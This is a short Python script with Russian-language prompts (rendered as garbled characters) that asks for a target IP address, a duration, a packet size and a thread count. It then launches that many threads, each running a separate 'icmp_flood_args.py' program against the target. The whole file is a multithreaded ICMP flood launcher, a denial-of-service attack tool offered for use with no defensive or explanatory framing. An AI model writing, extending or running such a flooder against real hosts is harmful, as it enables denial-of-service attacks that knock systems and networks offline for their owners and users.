# -*- coding: cp1251 -*-
import subprocess
import threading

def send_ping(ip_dest,duration,packet_size):
    subprocess.run(f'python icmp_flood_args.py -target {ip_dest} -duration {duration} -size {packet_size}', stdout=subprocess.DEVNULL)

def main():
    ip_destination = str(input('IP - ����� ���������� �����: '))
    duration = int(input('����������������� ����� (�): '))
    sent_buff_size = int(input('������ ������ (����): '))
    num_threads = int(input('���������� �������: '))

    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=send_ping, args=(ip_destination,duration,sent_buff_size))
        threads.append(thread)
        thread.start()
    print('\nRunning')
    for thread in threads:
        thread.join()

if __name__ == '__main__':
    main()